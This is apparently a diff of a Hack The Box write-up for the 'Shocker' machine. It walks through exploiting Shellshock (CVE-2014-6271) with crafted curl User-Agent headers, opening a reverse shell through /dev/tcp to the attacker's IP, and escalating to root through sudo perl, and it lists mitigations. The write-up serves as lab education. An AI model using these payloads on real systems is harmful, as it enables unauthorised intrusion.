@@ -9,7 +9,7 @@ tags: [shellshock,web application]    # TAG names should always be lowercase
 
 ## Enumeration
 
-Let's start by running a [AutoRecon]([asdf](https://github.com/Tib3rius/AutoRecon)) against our box at `10.10.10.56`
+Let's start by running a [AutoRecon](https://github.com/Tib3rius/AutoRecon) against our box at `10.10.10.56`
 
 ```bash
 sudo autorecon 10.10.10.56
@@ -28,7 +28,7 @@ SSH is on a non standard port, but is irrelevant. Let's check out the apache web
 
 Nothing much here, checking  the source code only reveals bug.jpg which isn't useful
 
-Let's check out dirbuster scan provided to us by autorecon
+Let's check our dirbuster scan provided to us by autorecon
 
 ![Dirbuster](/assets/images/HTB%20-%20Shocker/Shocker%20Dirbuster.png)
 
@@ -54,20 +54,21 @@ curl http://10.10.10.56/cgi-bin/user.sh
 
 ![Curl Request](/assets/images/HTB%20-%20Shocker/Curl%20Request.png)
 
-I got stuck here, and apparently this directory is vulnerable to an exploit called [Shellshock](https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html#:~:text=Shellshock%2C%20also%20known%20as%20the,to%20a%20Bash%2Dbased%20application.). It's a vulnerability in old versions of Bash that lets attackers send HTTP requests that manipulate variables due to improper handling of environment variable function definitions
+I got stuck here, apparently this directory is vulnerable to an exploit called [Shellshock](https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html#:~:text=Shellshock%2C%20also%20known%20as%20the,to%20a%20Bash%2Dbased%20application.). It's a vulnerability in old versions of Bash that lets attackers send HTTP requests that manipulate variables due to the improper handling of environment variable function
 
-We can run a specific nmap scan against this to test if the target is vulnerable
+We can run a specific nmap scan against this to ascertain if the target is vulnerable
 
 ```bash
 nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
 ```
+
 ![Shocker Nmap](/assets/images/HTB%20-%20Shocker/Shocker%20nmap.png)
 
 Our nmap scans confirms the target is vulernable to [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271) I.E Shellshock
 
-## Exploiting without Metasploit
+### Exploiting without Metasploit ?
 
-There's a metasploit module that gets us user level access with the click of a button, but let's try exploiting manually first
+There's a metasploit module that gets us user level access with the click of a button, but let's try exploiting manually for this box
 
 We will use the following curl to make a malicious HTTP request with a specially crafted User-Agent header
 
@@ -75,21 +76,20 @@ We will use the following curl to make a malicious HTTP request with a specially
 url -H "User-Agent: () { :;}; echo; /bin/bash -c 'whoami'"
 ```
 
-- `() { :;}:` Defines a function in the User-Agent header
-- `/bin/bash -c 'id'` Part of the command that is executed by the vulnerable bash interpreter
+- `() { :;}:` Defines a function in the User-Agent header (empty)
+- `/bin/bash -c 'id'` The command that is executed by the vulnerable bash interpreter
 
-Since this sever is confirmed to be running an outdated version of bash, it will process our user-agent header as a function definition. This happens because bash **before the shellshock update** processes the user agent header as a function definition instead of plain
+Since this sever is confirmed to be running an outdated version of bash, it will process our user-agent header as a function definition. This happens because bash (**before the shellshock update**) processes the user agent header as a function definition instead of plain text
 
 ![Shell Shocked](/assets/images/HTB%20-%20Shocker/Shell%20Shocked.png)
 
-We have RCE. Let's get our shell going. I'll start up my nc listener and perform the following curl request
+We have RCE. Let's get our shell going. I'll start up my nc listener and perform the following curl request with the reverse shell one liner
 
 ```bash
 curl -H "User-Agent: () { :;}; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'" http://10.10.10.56/cgi-bin/user.sh
 ```
 
 ![Shell](/assets/images/HTB%20-%20Shocker/Shell.png)
-
 
 ## Privilege Escalation
 
@@ -108,24 +108,24 @@ GG, we've rooted Shocker!
 
 ![Rooted](/assets/images/HTB%20-%20Shocker/Root%20Shocker.png)
 
-
-
-
 ## Summary
 
-1. Initial enumeration discovered Web server
-2. Directory busting web server discoverd CGI
-3. Gained root though SMB exploit running as root
+1. Initial Enumeration  discovered a web server
+2. Directory Busting  found /cgi-bin/user.sh
+3. Nmap Scanning  confirmed vulnerability to Shellshock
+4. Curl HTTP Request verified Shellshock exploit
+5. Reverse Shell established a connection back to your machine
+6. Ran sudo -l to discover sudo rights for usr/bin/perl without a password
+7. Used perl to execute /bin/sh as root
 
 ## Vulnerabilities & Mitigation
 
 | Vulnerability     | Mitigation            |
 |-------------------|-----------------------|
-| Anonymous FTP login allowed  | Disable anonymous FTP login |
-|Outdated FTP version (vsftpd 2.3.4)|Update to the latest version of vsftpd|
-|  Vulnerable SMB version (3.0.20-3.0.25rc3) | Update Samba to the latest version to patch the vulnerability
+| Shellshock (CVE-2014-6271) in CGI scripts  | Update Bash to the latest version. Ensure scripts properly sanitize input.|
+| Sudo privilege escalation NOPASSWD | Restrict sudo permissions and require passwords for all commands
 
 ### Remediation References
 
-- [Disable FTP Anonymous Login](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/site/ftpserver/security/authentication/anonymousauthentication)
-- [NIST SP 800-53](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)
+- [Mitre.org - Update Bash to the latest version](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+- [Restrict sudo permissions and require passwords for all commands](https://www.sudo.ws/security.html).
